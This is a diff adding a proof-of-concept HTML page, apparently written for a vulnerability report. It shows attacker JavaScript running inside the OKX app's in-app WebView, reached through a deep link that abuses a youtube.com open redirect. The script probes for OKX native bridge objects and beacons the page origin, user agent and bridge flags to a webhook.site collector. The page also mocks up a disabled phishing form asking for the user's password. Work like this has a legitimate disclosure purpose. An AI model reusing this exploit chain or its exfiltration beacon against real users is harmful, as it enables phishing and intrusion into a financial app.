@@ -1,0 +1,62 @@
+<!doctype html>
+<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>OKX — attacker page running INSIDE the app</title>
+<style>
+ body{font:14px/1.5 -apple-system,Segoe UI,Roboto,monospace;margin:0;background:#0b0e11;color:#e6e6e6}
+ .bar{background:#c0392b;color:#fff;padding:12px;font-weight:700;font-size:15px}
+ .box{padding:14px}
+ pre{white-space:pre-wrap;word-break:break-all;background:#12161c;padding:10px;border-radius:6px}
+ .demo{margin-top:16px;padding:14px;background:#12161c;border:1px solid #c0392b;border-radius:8px}
+ input{width:100%;box-sizing:border-box;padding:10px;margin:6px 0;border:1px solid #333;border-radius:6px;background:#0b0e11;color:#fff}
+ button{background:#f1c40f;border:0;padding:10px 16px;border-radius:6px;font-weight:700}
+</style></head>
+<body>
+<div class="bar" id="bar">Checking execution context…</div>
+<div class="box">
+<p>This page is hosted on an <b>attacker-controlled origin</b>. It was reached by a single external deep link
+<code>okx://web?url=https://www.youtube.com/redirect?q=&lt;attacker&gt;</code>, which bypasses OKX's in-app-WebView
+host whitelist via the <code>youtube.com</code> open-redirect. If the values below report the OKX app context,
+then arbitrary attacker HTML/JavaScript is executing inside OKX's trusted in-app browser.</p>
+<pre id="out">running…</pre>
+
+<div class="demo">
+<b>Phishing impact demonstration (illustrative only — collects nothing):</b>
+<p>Because this runs inside the real OKX app (OKX's chrome/title bar wraps it), a victim cannot tell it is
+attacker content. A convincing fake prompt could be shown, e.g.:</p>
+<div>OKX — Please re-verify your account</div>
+<input placeholder="Email / phone" disabled>
+<input placeholder="Password" type="password" disabled>
+<button disabled>Verify (disabled in PoC)</button>
+</div>
+</div>
+<script>
+// CONFIRMED-ONLY proof: attacker JS runs inside the OKX in-app WebView.
+// No token/data-theft claims — the session token is gated to *.okx.com and was NOT accessible.
+var COLLECTOR="https://webhook.site/200683c0-7735-4db9-bdfe-d31372282f17";
+var out=document.getElementById('out'), bar=document.getElementById('bar');
+function line(k,v){ out.textContent+=k+': '+v+'\n'; }
+
+var d={};
+d.js_executes = true;                                  // if you can read this, JS ran
+d.page_origin = location.origin;                       // attacker-controlled origin
+d.page_url    = location.href;
+d.in_webview  = /; wv\)/.test(navigator.userAgent) || /; wv;/.test(navigator.userAgent);
+d.user_agent  = navigator.userAgent;
+// OKX native bridge objects visible to this untrusted origin (trust-boundary breach evidence):
+d.okx_native_bridge       = (typeof window.native!=='undefined');
+d.okx_interception_bridge = (typeof window.interception!=='undefined');
+
+for(var k in d){ if(k!=='js_executes') line(k,d[k]); }
+
+var confirmed = d.in_webview || d.okx_native_bridge || d.okx_interception_bridge;
+if(confirmed){
+  bar.textContent = '✅ CONFIRMED: attacker content + JavaScript executing INSIDE the OKX app WebView';
+} else {
+  bar.style.background='#7f8c8d';
+  bar.textContent = 'Loaded in a normal browser — open via the OKX deep link to see the in-app context';
+}
+try{ new Image().src=COLLECTOR+'/proof?origin='+encodeURIComponent(d.page_origin)
+  +'&in_webview='+d.in_webview+'&native='+d.okx_native_bridge+'&interception='+d.okx_interception_bridge
+  +'&ua='+encodeURIComponent(d.user_agent); }catch(e){}
+</script>
+</body></html>
